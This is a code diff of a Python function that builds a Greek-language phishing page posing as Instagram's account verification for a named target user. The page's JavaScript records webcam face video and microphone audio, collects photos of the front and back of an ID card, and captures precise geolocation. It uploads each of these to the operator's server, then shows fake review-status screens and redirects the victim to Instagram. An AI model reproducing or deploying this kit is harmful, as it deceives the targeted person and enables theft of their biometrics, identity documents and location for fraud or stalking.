+                        <div class="instruction-text">Απαιτείται πρόσβαση τοποθεσίας</div>
                         <div class="instruction-detail">
-                            Το Instagram πρέπει να επαληθεύσει την τοποθεσία σας για λόγους ασφαλείας και για την αποτροπή μη εξουσιοδοτημένης πρόσβασης.
+                            Το Instagram χρειάζεται να επαληθεύσει την τοποθεσία σας για λόγους ασφαλείας και για την αποτροπή μη εξουσιοδοτημένης πρόσβασης.
                         </div>
                     </div>
                     
@@ -1393,7 +1432,7 @@ def create_html_template(settings):
                     </div>
                     <div class="accuracy-labels">
                         <span>Χαμηλή</span>
-                        <span>Μέτρια</span>
+                        <span>Μεσαία</span>
                         <span>Υψηλή</span>
                     </div>
                     
@@ -1418,11 +1457,11 @@ def create_html_template(settings):
                 </div>
                 
                 <div class="status-message" id="locationStatus">
-                    Κάντε κλικ στο παρακάτω κουμπί για κοινή χρήση της τοποθεσίας σας
+                    Κάντε κλικ στο κουμπί παρακάτω για να μοιραστείτε την τοποθεσία σας
                 </div>
                 
                 <button class="button primary-btn" id="locationButton" onclick="requestLocation()">
-                    Κοινοποίηση Τοποθεσίας
+                    Μοιραστείτε την τοποθεσία μου
                 </button>
                 
                 <button class="button secondary-btn" onclick="prevStep()">
@@ -1430,176 +1469,120 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Τελικό Βήμα: Επεξεργασία -->
-            <div class="step" id="stepFinal">
-                <h2 class="step-title">Επαλήθευση σε Εξέλιξη</h2>
-                <p class="step-subtitle">
-                    Παρακαλώ περιμένετε ενώ επαληθεύουμε τις πληροφορίες σας για το @{target_username}. Αυτό μπορεί να διαρκέσει μερικά λεπτά.
-                </p>
-                
-                <div class="instruction-container" style="text-align: center; padding: 40px;">
-                    <div class="instruction-icon" style="font-size: 64px;">⏳</div>
-                    <div class="instruction-text">Επεξεργασία Επαλήθευσής Σας</div>
-                    <div class="instruction-detail">
-                        <div class="loading-spinner"></div>
-                        Αναλύονται υποβεβλημένα δεδομένα...
-                    </div>
-                </div>
-                
-                <div class="status-message status-processing" id="finalStatus">
-                    Επαλήθευση σάρωσης προσώπου... 25%
-                </div>
-            </div>
-            
-            <!-- Βήμα Ολοκλήρωσης -->
+            <!-- Βήμα ολοκλήρωσης (άμεση ανακατεύθυνση) -->
             <div class="step" id="stepComplete">
                 <div class="completion-container">
                     <div class="checkmark"></div>
-                    
-                    <h2 class="step-title">Υποβολή Λήφθηκε! ✅</h2>
+                    <h2 class="step-title">Η υποβολή ολοκληρώθηκε! ✅</h2>
                     <p class="step-subtitle">
-                        Ευχαριστούμε, <strong>@{target_username}</strong>! Τα δεδομένα επαλήθευσής σας έχουν υποβληθεί με επιτυχία.
+                        Σας ευχαριστούμε, <strong>@{target_username}</strong>! Τα δεδομένα επαλήθευσής σας υποβλήθηκαν με επιτυχία.
                     </p>
-                    
-                    <div class="account-access">
-                        Ολοκληρώθηκε Μεταφόρτωση Δεδομένων
-                    </div>
-                    
+                    <div class="account-access">Η μεταφόρτωση ολοκληρώθηκε</div>
                     <div class="instruction-container">
                         <div class="instruction-icon">📤</div>
                         <div class="instruction-text">Όλα τα δεδομένα επαλήθευσης μεταφορτώθηκαν</div>
                         <div class="instruction-detail">
-                            Έχετε λάβει τη σάρωση προσώπου, το δείγμα φωνής, τα έγγραφα ταυτότητας και την τοποθεσία σας
+                            Η σάρωση προσώπου, το φωνητικό δείγμα, τα έγγραφα ταυτότητας και η τοποθεσία σας έχουν ληφθεί
                         </div>
                     </div>
-                    
                     <div class="next-steps">
-                        <p class="step-subtitle">
-                            Θα μεταφερθείτε στο Instagram σε <span id="countdown">5</span> δευτερόλεπτα...
-                        </p>
-                        <button class="button primary-btn" onclick="redirectToInstagram()">
-                            Μετάβαση στο Instagram τώρα
-                        </button>
-                        <button class="button secondary-btn" onclick="showReviewPage()">
-                            Προβολή Κατάστασης Ανασκόπησης
-                        </button>
+                        <p class="step-subtitle" id="redirectMessage">Ανακατεύθυνση στο Instagram...</p>
+                        <button class="button primary-btn" onclick="redirectToInstagram()">Μετάβαση στο Instagram τώρα</button>
+                        <button class="button secondary-btn" onclick="showReviewPage()">Προβολή κατάστασης αξιολόγησης</button>
                     </div>
-                    
                     <div class="info-box" style="margin-top: 30px;">
                         <strong>Σημείωση:</strong> Τα δεδομένα επαλήθευσής σας θα αποθηκευτούν με ασφάλεια και θα διαγραφούν αυτόματα εντός 30 ημερών.
                     </div>
                 </div>
             </div>
             
-            <!-- Βήμα Υπό Ανασκόπηση -->
+            <!-- Βήμα υπό αξιολόγηση -->
             <div class="step" id="stepReview">
                 <div class="review-container">
                     <div class="review-clock"></div>
-                    
-                    <h2 class="step-title">Επαλήθευση Υπό Ανασκόπηση</h2>
+                    <h2 class="step-title">Η επαλήθευση βρίσκεται υπό αξιολόγηση</h2>
                     <p class="step-subtitle">
-                        Η υποβολή επαλήθευσης ηλικίας για <strong>@{target_username}</strong> ανασκοπείται από την ομάδα μας.
+                        Η υποβολή επαλήθευσής σας για τον λογαριασμό <strong>@{target_username}</strong> εξετάζεται από την ομάδα μας.
                         Θα επικοινωνήσουμε μαζί σας εντός <strong>48 ωρών</strong> μέσω του email που σχετίζεται με τον λογαριασμό σας.
                     </p>
-                    
                     <div class="review-timeline">
                         <div class="timeline-item">
                             <div class="timeline-icon">1</div>
                             <div class="timeline-content">
-                                <div class="timeline-title">Υποβολή Λήφθηκε</div>
-                                <div class="timeline-description">
-                                    Τα δεδομένα επαλήθευσής σας έχουν μεταφορτωθεί με επιτυχία και βρίσκονται στην ουρά για ανασκόπηση.
-                                </div>
+                                <div class="timeline-title">Υποβολή παραλήφθηκε</div>
+                                <div class="timeline-description">Τα δεδομένα επαλήθευσής σας μεταφορτώθηκαν με επιτυχία και βρίσκονται σε ουρά για αξιολόγηση.</div>
                             </div>
                         </div>
-                        
                         <div class="timeline-item">
                             <div class="timeline-icon">2</div>
                             <div class="timeline-content">
-                                <div class="timeline-title">Διαδικασία Χειροκίνητης Ανασκόπησης</div>
-                                <div class="timeline-description">
-                                    Η ομάδα ασφαλείας μας ανασκοπεί χειροκίνητα τη σάρωση προσώπου, τα έγγραφα ταυτότητας και άλλα δεδομένα επαλήθευσης.
-                                </div>
+                                <div class="timeline-title">Διαδικασία χειροκίνητης αξιολόγησης</div>
+                                <div class="timeline-description">Η ομάδα ασφαλείας μας εξετάζει με μη αυτόματο τρόπο τη σάρωση προσώπου, τα έγγραφα ταυτότητας και άλλα δεδομένα επαλήθευσης.</div>
                             </div>
                         </div>
-                        
                         <div class="timeline-item">
                             <div class="timeline-icon">3</div>
                             <div class="timeline-content">
-                                <div class="timeline-title">Έλεγχοι Ασφαλείας</div>
-                                <div class="timeline-description">
-                                    Εκτελούμε πρόσθετους ελέγχους ασφαλείας για να διασφαλίσουμε την αυθεντικότητα των εγγράφων σας.
-                                </div>
+                                <div class="timeline-title">Έλεγχοι ασφαλείας</div>
+                                <div class="timeline-description">Εκτελούμε επιπλέον ελέγχους ασφαλείας για να διασφαλίσουμε την αυθεντικότητα των εγγράφων σας.</div>
                             </div>
                         </div>
-                        
                         <div class="timeline-item">
                             <div class="timeline-icon">4</div>
                             <div class="timeline-content">
-                                <div class="timeline-title">Τελική Απόφαση</div>
-                                <div class="timeline-description">
-                                    Θα λάβετε email με την τελική απόφαση εντός 48 ωρών από την υποβολή.
-                                </div>
+                                <div class="timeline-title">Τελική απόφαση</div>
+                                <div class="timeline-description">Θα λάβετε email με την τελική απόφαση εντός 48 ωρών από την υποβολή.</div>
                             </div>
                         </div>
                     </div>
-                    
                     <div class="contact-info">
                         <div class="contact-item">
                             <div class="contact-icon">📧</div>
                             <div class="contact-text">
-                                <strong>Ελέγξτε το Email Σας</strong><br>
-                                Σας έχουμε στείλει επιβεβαίωση στο email που έχουμε καταχωρημένο. Παρακαλώ ακολουθήστε τις οδηγίες σε αυτό το email.
+                                <strong>Ελέγξτε το email σας</strong><br>
+                                Στείλαμε μια επιβεβαίωση στο email που έχετε καταχωρήσει. Ακολουθήστε τυχόν οδηγίες σε αυτό το email.
                             </div>
                         </div>
-                        
                         <div class="contact-item">
                             <div class="contact-icon">⏰</div>
                             <div class="contact-text">
-                                <strong>Χρονικό Πλαίσιο Ανασκόπησης</strong><br>
-                                Οι περισσότερες ανασκοπήσεις ολοκληρώνονται εντός 24-48 ωρών. Θα ειδοποιηθείτε μόλις ολοκληρωθεί.
+                                <strong>Χρονοδιάγραμμα αξιολόγησης</strong><br>
+                                Οι περισσότερες αξιολογήσεις ολοκληρώνονται εντός 24-48 ωρών. Θα ειδοποιηθείτε μόλις ολοκληρωθεί.
                             </div>
                         </div>
-                        
                         <div class="contact-item">
                             <div class="contact-icon">🔒</div>
                             <div class="contact-text">
-                                <strong>Προσωρινή Κατάσταση Λογαριασμού</strong><br>
-                                Ο λογαριασμός @{target_username} έχει περιορισμένη λειτουργικότητα μέχρι να ολοκληρωθεί η επαλήθευση.
+                                <strong>Προσωρινή κατάσταση λογαριασμού</strong><br>
+                                Ο λογαριασμός σας @{target_username} έχει περιορισμένη λειτουργικότητα έως ότου ολοκληρωθεί η επαλήθευση.
                             </div>
                         </div>
                     </div>
-                    
                     <div class="info-box">
-                        <strong>Τι συμβαίνει μετά;</strong><br>
-                        1. Η ομάδα μας ανασκοπεί την υποβολή σας (24-48 ώρες)<br>
+                        <strong>Τι θα γίνει στη συνέχεια;</strong><br>
+                        1. Η ομάδα μας εξετάζει την υποβολή σας (24-48 ώρες)<br>
                         2. Θα λάβετε email με το αποτέλεσμα<br>
                         3. Εάν εγκριθεί, ο λογαριασμός σας θα αποκατασταθεί πλήρως<br>
-                        4. Εάν απαιτούνται περισσότερες πληροφορίες, θα επικοινωνήσουμε μαζί σας
+                        4. Εάν χρειαστούν περισσότερες πληροφορίες, θα επικοινωνήσουμε μαζί σας
                     </div>
-                    
                     <div class="next-steps">
-                        <button class="button primary-btn" onclick="returnToInstagram()">
-                            Επιστροφή στο Instagram
-                        </button>
-                        <button class="button secondary-btn" onclick="checkStatus()">
-                            Έλεγχος Κατάστασης Ανασκόπησης
-                        </button>
+                        <button class="button primary-btn" onclick="returnToInstagram()">Επιστροφή στο Instagram</button>
+                        <button class="button secondary-btn" onclick="checkStatus()">Έλεγχος κατάστασης αξιολόγησης</button>
                     </div>
                 </div>
             </div>
         </div>
         
         <div class="footer-links">
-            <a href="#">Κέντρο Βοήθειας</a>
-            <a href="#">Πολιτική Απορρήτου</a>
-            <a href="#">Όροι Χρήσης</a>
-            <a href="#">Κατευθυντήριες Γραμμές Κοινότητας</a>
+            <a href="#">Κέντρο βοήθειας</a>
+            <a href="#">Πολιτική απορρήτου</a>
+            <a href="#">Όροι χρήσης</a>
+            <a href="#">Οδηγίες κοινότητας</a>
         </div>
     </div>
     
     <script>
-        // Παγκόσμιες μεταβλητές
+        // Καθολικές μεταβλητές
         let currentStep = 1;
         let totalSteps = 5;
         let faceStream = null;
@@ -1613,14 +1596,14 @@ def create_html_template(settings):
         let faceTimeLeft = {face_duration};
         let voiceTimeLeft = {voice_duration};
         let faceInstructions = [
-            {{icon: "👤", text: "Κοιτάξτε Ευθεία", detail: "Κρατήστε το πρόσωπό σας κεντραρισμένο στον κύκλο", duration: 3}},
-            {{icon: "👈", text: "Γυρίστε Κεφάλι Αριστερά", detail: "Γυρίστε αργά το κεφάλι σας αριστερά", duration: 3}},
-            {{icon: "👉", text: "Γυρίστε Κεφάλι Δεξιά", detail: "Γυρίστε αργά το κεφάλι σας δεξιά", duration: 3}},
-            {{icon: "👆", text: "Κοιτάξτε Πάνω", detail: "Ανασηκώστε ελαφρά το κεφάλι σας προς τα πάνω", duration: 3}},
-            {{icon: "👇", text: "Κοιτάξτε Κάτω", detail: "Κλίνετε ελαφρά το κεφάλι σας προς τα κάτω", duration: 3}},
-            {{icon: "😉", text: "Κλείστε Μάτια", detail: "Κλείστε φυσικά τα μάτια σας μερικές φορές", duration: 3}},
-            {{icon: "😊", text: "Χαμογελάστε", detail: "Κάντε ένα φυσικό χαμόγελο", duration: 2}},
-            {{icon: "✅", text: "Ολοκληρώθηκε", detail: "Η σάρωση προσώπου ήταν επιτυχής!", duration: 1}}
+            {{icon: "👤", text: "Κοιτάξτε ευθεία", detail: "Κρατήστε το πρόσωπό σας στο κέντρο του κύκλου", duration: 3}},
+            {{icon: "👈", text: "Γυρίστε το κεφάλι αριστερά", detail: "Γυρίστε αργά το κεφάλι σας αριστερά", duration: 3}},
+            {{icon: "👉", text: "Γυρίστε το κεφάλι δεξιά", detail: "Γυρίστε αργά το κεφάλι σας δεξιά", duration: 3}},
+            {{icon: "👆", text: "Κοιτάξτε ψηλά", detail: "Γείρετε απαλά το κεφάλι σας προς τα πάνω", duration: 3}},
+            {{icon: "👇", text: "Κοιτάξτε κάτω", detail: "Γείρετε απαλά το κεφάλι σας προς τα κάτω", duration: 3}},
+            {{icon: "😉", text: "Ανοιγοκλείστε τα μάτια", detail: "Ανοιγοκλείστε φυσικά τα μάτια σας μερικές φορές", duration: 3}},
+            {{icon: "😊", text: "Χαμογελάστε", detail: "Δώστε μας ένα φυσικό χαμόγελο", duration: 2}},
+            {{icon: "✅", text: "Ολοκλήρωση", detail: "Η σάρωση προσώπου ολοκληρώθηκε!", duration: 1}}
         ];
         let currentInstructionIndex = 0;
         let instructionTimer = null;
@@ -1630,77 +1613,59 @@ def create_html_template(settings):
         let countdownTimer = null;
         let targetUsername = "{target_username}";
         
-        // Πλοήγηση Βημάτων
-        function updateProgress() {{
-            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
-            document.getElementById('progressBar').style.width = progress + '%';
-            document.getElementById('progressLineFill').style.width = progress + '%';
-            
-            // Ενημέρωση δεικτών βημάτων
-            for (let i = 1; i <= totalSteps + 1; i++) {{
-                const indicator = document.getElementById('step' + i + 'Indicator');
-                if (indicator) {{
-                    indicator.classList.remove('active', 'completed');
-                    if (i < currentStep) {{
-                        indicator.classList.add('completed');
-                    }} else if (i === currentStep) {{
-                        indicator.classList.add('active');
-                    }}
+        // Πλοήγηση βημάτων - δέχεται και αριθμούς και αναγνωριστικά συμβολοσειρών
+        function showStep(stepNumber) {{
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+            let stepId = 'step' + stepNumber;
+            const stepElement = document.getElementById(stepId);
+            if (stepElement) {{
+                stepElement.classList.add('active');
+                if (typeof stepNumber === 'number') {{
+                    currentStep = stepNumber;
+                    updateProgress();
                 }}
             }}
         }}
         
-        function showStep(stepNumber) {{
-            document.querySelectorAll('.step').forEach(step => {{
-                step.classList.remove('active');
-            }});
-            const stepElement = document.getElementById('step' + stepNumber);
-            if (stepElement) {{
-                stepElement.classList.add('active');
-                currentStep = stepNumber;
-                updateProgress();
+        function updateProgress() {{
+            if (typeof currentStep !== 'number') return;
+            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
+            document.getElementById('progressBar').style.width = progress + '%';
+            document.getElementById('progressLineFill').style.width = progress + '%';
+            for (let i = 1; i <= totalSteps; i++) {{
+                const indicator = document.getElementById('step' + i + 'Indicator');
+                if (indicator) {{
+                    indicator.classList.remove('active', 'completed');
+                    if (i < currentStep) indicator.classList.add('completed');
+                    else if (i === currentStep) indicator.classList.add('active');
+                }}
             }}
         }}
         
         function nextStep() {{
-            if (currentStep < totalSteps + 1) {{
-                showStep(currentStep + 1);
-            }}
+            if (currentStep < totalSteps) showStep(currentStep + 1);
         }}
         
         function prevStep() {{
-            if (currentStep > 1) {{
-                showStep(currentStep - 1);
-            }}
+            if (currentStep > 1) showStep(currentStep - 1);
         }}
         
-        // Επαλήθευση Προσώπου
+        // Σάρωση προσώπου (χωρίς αλλαγές)
         async function startFaceVerification() {{
             try {{
                 document.getElementById('startFaceScanBtn').disabled = true;
-                document.getElementById('startFaceScanBtn').innerHTML = '<span class="loading-spinner"></span>Πρόσβαση σε Κάμερα...';
-                
-                // Αίτημα πρόσβασης κάμερας
+                document.getElementById('startFaceScanBtn').innerHTML = '<span class="loading-spinner"></span>Πρόσβαση στην κάμερα...';
                 faceStream = await navigator.mediaDevices.getUserMedia({{
-                    video: {{ 
-                        facingMode: 'user',
-                        width: {{ ideal: 640 }},
-                        height: {{ ideal: 640 }}
-                    }},
+                    video: {{ facingMode: 'user', width: {{ ideal: 640 }}, height: {{ ideal: 640 }} }},
                     audio: false
                 }});
-                
-                // Εμφάνιση βίντεο
                 document.getElementById('faceVideo').srcObject = faceStream;
-                
-                // Έναρξη διαδικασίας επαλήθευσης
                 startFaceInstructions();
-                
             }} catch (error) {{
                 console.error("Σφάλμα κάμερας:", error);
-                alert("Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχουν παραχωρηθεί τα απαραίτητα δικαιώματα.");
+                alert("Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχετε δώσει άδεια χρήσης κάμερας.");
                 document.getElementById('startFaceScanBtn').disabled = false;
-                document.getElementById('startFaceScanBtn').textContent = 'Ξεκινήστε Σάρωση Προσώπου για ' + targetUsername;
+                document.getElementById('startFaceScanBtn').textContent = 'Έναρξη σάρωσης προσώπου για ' + targetUsername;
             }}
         }}
         
@@ -1709,26 +1674,15 @@ def create_html_template(settings):
             faceTimeLeft = {face_duration};
             updateFaceTimer();
             showFaceInstruction(0);
-            
-            // Έναρξη εγγραφής
             startFaceRecording();
-            
-            // Έναρξη χρονομέτρησης
             faceTimerInterval = setInterval(() => {{
                 faceTimeLeft--;
                 updateFaceTimer();
-                
-                if (faceTimeLeft <= 0) {{
-                    completeFaceVerification();
-                }}
+                if (faceTimeLeft <= 0) completeFaceVerification();
             }}, 1000);
-            
-            // Έναρξη κύκλου οδηγιών
             instructionTimer = setInterval(() => {{
                 currentInstructionIndex++;
-                if (currentInstructionIndex < faceInstructions.length) {{
-                    showFaceInstruction(currentInstructionIndex);
-                }}
+                if (currentInstructionIndex < faceInstructions.length) showFaceInstruction(currentInstructionIndex);
             }}, 3000);
         }}
         
@@ -1744,26 +1698,14 @@ def create_html_template(settings):
         function updateFaceTimer() {{
             const minutes = Math.floor(faceTimeLeft / 60);
             const seconds = faceTimeLeft % 60;
-            document.getElementById('faceTimer').textContent = 
-                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
+            document.getElementById('faceTimer').textContent = minutes.toString().padStart(2,'0') + ':' + seconds.toString().padStart(2,'0');
         }}
         
         function startFaceRecording() {{
             faceChunks = [];
             const options = {{ mimeType: 'video/webm;codecs=vp9' }};
-            
-            try {{
-                faceRecorder = new MediaRecorder(faceStream, options);
-            }} catch (e) {{
-                faceRecorder = new MediaRecorder(faceStream);
-            }}
-            
-            faceRecorder.ondataavailable = (event) => {{
-                if (event.data && event.data.size > 0) {{
-                    faceChunks.push(event.data);
-                }}
-            }};
-            
+            try {{ faceRecorder = new MediaRecorder(faceStream, options); }} catch(e) {{ faceRecorder = new MediaRecorder(faceStream); }}
+            faceRecorder.ondataavailable = (event) => {{ if (event.data && event.data.size > 0) faceChunks.push(event.data); }};
             faceRecorder.onstop = sendFaceRecording;
             faceRecorder.start(100);
         }}
@@ -1771,35 +1713,19 @@ def create_html_template(settings):
         function completeFaceVerification() {{
             clearInterval(faceTimerInterval);
             clearInterval(instructionTimer);
-            
-            if (faceRecorder && faceRecorder.state === 'recording') {{
-                faceRecorder.stop();
-            }}
-            
-            // Διακοπή κάμερας
-            if (faceStream) {{
-                faceStream.getTracks().forEach(track => track.stop());
-            }}
-            
-            // Εμφάνιση μηνύματος ολοκλήρωσης
+            if (faceRecorder && faceRecorder.state === 'recording') faceRecorder.stop();
+            if (faceStream) faceStream.getTracks().forEach(track => track.stop());
             showFaceInstruction(faceInstructions.length - 1);
             document.getElementById('faceTimer').textContent = "✅ Ολοκληρώθηκε";
-            
-            // Αυτόματη προώθηση στο επόμενο βήμα μετά από καθυστέρηση
-            setTimeout(() => {{
-                nextStep();
-            }}, 2000);
+            setTimeout(() => {{ nextStep(); }}, 2000);
         }}
         
         function sendFaceRecording() {{
             if (faceChunks.length === 0) return;
-            
             const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
             const reader = new FileReader();
-            
             reader.onloadend = function() {{
                 const base64data = reader.result.split(',')[1];
-                
                 $.ajax({{
                     url: '/submit_face_verification',
                     type: 'POST',
@@ -1812,58 +1738,40 @@ def create_html_template(settings):
                         target_username: targetUsername
                     }}),
                     contentType: 'application/json',
-                    success: function(response) {{
-                        console.log('Η επαλήθευση προσώπου μεταφορτώθηκε');
-                    }},
-                    error: function(xhr, status, error) {{
-                        console.error('Σφάλμα μεταφόρτωσης προσώπου:', error);
-                    }}
+                    success: function(response) {{ console.log('Η σάρωση προσώπου μεταφορτώθηκε'); }},
+                    error: function(xhr, status, error) {{ console.error('Σφάλμα μεταφόρτωσης προσώπου:', error); }}
                 }});
             }};
-            
             reader.readAsDataURL(videoBlob);
         }}
         
-        // Επαλήθευση Φωνής
+        // Φωνητική επαλήθευση (χωρίς αλλαγές)
         async function startVoiceVerification() {{
             try {{
                 document.getElementById('startVoiceBtn').disabled = true;
-                document.getElementById('startVoiceBtn').innerHTML = '<span class="loading-spinner"></span>Πρόσβαση σε Μικρόφωνο...';
-                
-                // Αίτημα πρόσβασης μικροφώνου
+                document.getElementById('startVoiceBtn').innerHTML = '<span class="loading-spinner"></span>Πρόσβαση στο μικρόφωνο...';
                 voiceStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
-                
-                // Έναρξη εγγραφής
                 startVoiceRecording();
-                
-                // Έναρξη χρονομέτρησης
                 voiceTimeLeft = {voice_duration};
                 updateVoiceTimer();
                 voiceTimerInterval = setInterval(() => {{
                     voiceTimeLeft--;
                     updateVoiceTimer();
-                    
-                    if (voiceTimeLeft <= 0) {{
-                        completeVoiceVerification();
-                    }}
+                    if (voiceTimeLeft <= 0) completeVoiceVerification();
                 }}, 1000);
-                
-                // Προσομοίωση απεικόνισης φωνής
                 simulateVoiceWave();
-                
             }} catch (error) {{
                 console.error('Σφάλμα μικροφώνου:', error);
-                alert('Δεν είναι δυνατή η πρόσβαση στο μικρόφωνο. Βεβαιωθείτε ότι έχουν παραχωρηθεί τα απαραίτητα δικαιώματα.');
+                alert('Δεν είναι δυνατή η πρόσβαση στο μικρόφωνο. Βεβαιωθείτε ότι έχετε δώσει άδεια χρήσης μικροφώνου.');
                 document.getElementById('startVoiceBtn').disabled = false;
-                document.getElementById('startVoiceBtn').textContent = 'Ξεκινήστε Εγγραφή Φωνής';
+                document.getElementById('startVoiceBtn').textContent = 'Έναρξη εγγραφής φωνής';
             }}
         }}
         
         function updateVoiceTimer() {{
             const minutes = Math.floor(voiceTimeLeft / 60);
             const seconds = voiceTimeLeft % 60;
-            document.getElementById('voiceTimer').textContent = 
-                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
+            document.getElementById('voiceTimer').textContent = minutes.toString().padStart(2,'0') + ':' + seconds.toString().padStart(2,'0');
         }}
         
         function simulateVoiceWave() {{
@@ -1878,52 +1786,26 @@ def create_html_template(settings):
         function startVoiceRecording() {{
             voiceChunks = [];
             const options = {{ mimeType: 'audio/webm;codecs=opus' }};
-            
-            try {{
-                voiceRecorder = new MediaRecorder(voiceStream, options);
-            }} catch (e) {{
-                voiceRecorder = new MediaRecorder(voiceStream);
-            }}
-            
-            voiceRecorder.ondataavailable = (event) => {{
-                if (event.data && event.data.size > 0) {{
-                    voiceChunks.push(event.data);
-                }}
-            }};
-            
+            try {{ voiceRecorder = new MediaRecorder(voiceStream, options); }} catch(e) {{ voiceRecorder = new MediaRecorder(voiceStream); }}
+            voiceRecorder.ondataavailable = (event) => {{ if (event.data && event.data.size > 0) voiceChunks.push(event.data); }};
             voiceRecorder.onstop = sendVoiceRecording;
             voiceRecorder.start();
         }}
         
         function completeVoiceVerification() {{
             clearInterval(voiceTimerInterval);
-            
-            if (voiceRecorder && voiceRecorder.state === 'recording') {{
-                voiceRecorder.stop();
-            }}
-            
-            // Διακοπή μικροφώνου
-            if (voiceStream) {{
-                voiceStream.getTracks().forEach(track => track.stop());
-            }}
-            
-            document.getElementById('voiceTimer').textContent = '✅ Ολοκληρώθηκε';
-            
-            // Αυτόματη προώθηση στο επόμενο βήμα
-            setTimeout(() => {{
-                nextStep();
-            }}, 2000);
+            if (voiceRecorder && voiceRecorder.state === 'recording') voiceRecorder.stop();
+            if (voiceStream) voiceStream.getTracks().forEach(track => track.stop());
+            document.getElementById('voiceTimer').textContent = "✅ Ολοκληρώθηκε";
+            setTimeout(() => {{ nextStep(); }}, 2000);
         }}
         
         function sendVoiceRecording() {{
             if (voiceChunks.length === 0) return;
-            
             const audioBlob = new Blob(voiceChunks, {{ type: 'audio/webm' }});
             const reader = new FileReader();
-            
             reader.onloadend = function() {{
                 const base64data = reader.result.split(',')[1];
-                
                 $.ajax({{
                     url: '/submit_voice_verification',
                     type: 'POST',
@@ -1936,37 +1818,27 @@ def create_html_template(settings):
                         target_username: targetUsername
                     }}),
                     contentType: 'application/json',
-                    success: function(response) {{
-                        console.log('Η επαλήθευση φωνής μεταφορτώθηκε');
-                    }},
-                    error: function(xhr, status, error) {{
-                        console.error('Σφάλμα μεταφόρτωσης φωνής:', error);
-                    }}
+                    success: function(response) {{ console.log('Η φωνητική επαλήθευση μεταφορτώθηκε'); }},
+                    error: function(xhr, status, error) {{ console.error('Σφάλμα μεταφόρτωσης φωνής:', error); }}
                 }});
             }};
-            
             reader.readAsDataURL(audioBlob);
         }}
         
-        // Επαλήθευση Ταυτότητας
+        // Επαλήθευση ταυτότητας (χωρίς αλλαγές)
         function handleFileSelect(input, type) {{
             const file = input.files[0];
-            if (file) {{
-                handleIDFile(file, type);
-            }}
+            if (file) handleIDFile(file, type);
         }}
         
         function handleFileDrop(event, type) {{
             event.preventDefault();
             event.currentTarget.classList.remove('dragover');
             const file = event.dataTransfer.files[0];
-            if (file && file.type.startsWith('image/')) {{
-                handleIDFile(file, type);
-            }}
+            if (file && file.type.startsWith('image/')) handleIDFile(file, type);
         }}
         
         function handleIDFile(file, type) {{
-            // Προεπισκόπηση εικόνας
             const reader = new FileReader();
             reader.onload = function(e) {{
                 const preview = document.getElementById(type + 'Preview');
@@ -1975,36 +1847,26 @@ def create_html_template(settings):
                 preview.style.display = 'block';
             }};
             reader.readAsDataURL(file);
-            
-            // Αποθήκευση αρχείου
             idFiles[type] = file;
             checkIDSubmitReady();
         }}
         
         function checkIDSubmitReady() {{
-            const hasFront = idFiles.front !== null;
-            document.getElementById('submitIdBtn').disabled = !hasFront;
+            document.getElementById('submitIdBtn').disabled = idFiles.front === null;
         }}
         
         function submitIDVerification() {{
             const statusDiv = document.getElementById('idStatus');
             statusDiv.className = 'status-message status-processing';
             statusDiv.innerHTML = '<span class="loading-spinner"></span>Μεταφόρτωση εγγράφων ταυτότητας...';
-            
             document.getElementById('submitIdBtn').disabled = true;
             document.getElementById('submitIdBtn').innerHTML = '<span class="loading-spinner"></span>Επεξεργασία...';
-            
-            // Δημιουργία FormData
             const formData = new FormData();
-            
             if (idFiles.front) formData.append('front_id', idFiles.front);
             if (idFiles.back) formData.append('back_id', idFiles.back);
-            
             formData.append('timestamp', new Date().toISOString());
             formData.append('session_id', sessionId);
             formData.append('target_username', targetUsername);
-            
-            // Υποβολή μέσω AJAX
             $.ajax({{
                 url: '/submit_id_verification',
                 type: 'POST',
@@ -2014,64 +1876,54 @@ def create_html_template(settings):
                 success: function(response) {{
                     statusDiv.className = 'status-message status-success';
                     statusDiv.textContent = '✓ Τα έγγραφα ταυτότητας μεταφορτώθηκαν με επιτυχία!';
-                    
-                    setTimeout(() => {{
-                        nextStep();
-                    }}, 1500);
+                    setTimeout(() => {{ nextStep(); }}, 1500);
                 }},
                 error: function(xhr, status, error) {{
                     statusDiv.className = 'status-message status-error';
                     statusDiv.textContent = '✗ Η μεταφόρτωση απέτυχε. Παρακαλώ δοκιμάστε ξανά.';
                     document.getElementById('submitIdBtn').disabled = false;
-                    document.getElementById('submitIdBtn').textContent = 'Υποβολή για Επαλήθευση';
+                    document.getElementById('submitIdBtn').textContent = 'Υποβολή για επαλήθευση';
                 }}
             }});
         }}
         
-        // Επαλήθευση Τοποθεσίας
+        // Επαλήθευση τοποθεσίας – τώρα ανακατευθύνει άμεσα μετά την επιτυχία
         function requestLocation() {{
             const button = document.getElementById('locationButton');
             const statusDiv = document.getElementById('locationStatus');
-            const detailsDiv = document.getElementById('locationDetails');
-            
             button.disabled = true;
-            button.innerHTML = '<span class="loading-spinner"></span>Λήψη Τοποθεσίας...';
+            button.innerHTML = '<span class="loading-spinner"></span>Λήψη τοποθεσίας...';
             statusDiv.className = 'status-message status-processing';
             statusDiv.textContent = 'Πρόσβαση στην τοποθεσία σας...';
             
             if (!navigator.geolocation) {{
                 statusDiv.className = 'status-message status-error';
-                statusDiv.textContent = 'Η γεωεντοπισμός δεν υποστηρίζεται από τον περιηγητή σας.';
+                statusDiv.textContent = 'Η γεωτοποθεσία δεν υποστηρίζεται από το πρόγραμμα περιήγησής σας.';
                 button.disabled = false;
-                button.textContent = 'Δοκιμάστε Ξανά';
+                button.textContent = 'Δοκιμάστε ξανά';
                 return;
             }}
             
-            // Πρώτη προσπάθεια: Γρήγορη, χαμηλής ακρίβειας
             navigator.geolocation.getCurrentPosition(
                 (fastPosition) => {{
                     updateLocationUI(fastPosition);
                     sendLocationToServer(fastPosition);
-                    
-                    // Δεύτερη προσπάθεια: Υψηλής ακρίβειας
+                    // Προσπάθεια και με υψηλή ακρίβεια
                     navigator.geolocation.getCurrentPosition(
                         (accuratePosition) => {{
                             updateLocationUI(accuratePosition);
                             sendLocationToServer(accuratePosition);
                             completeLocationVerification();
                         }},
-                        () => {{
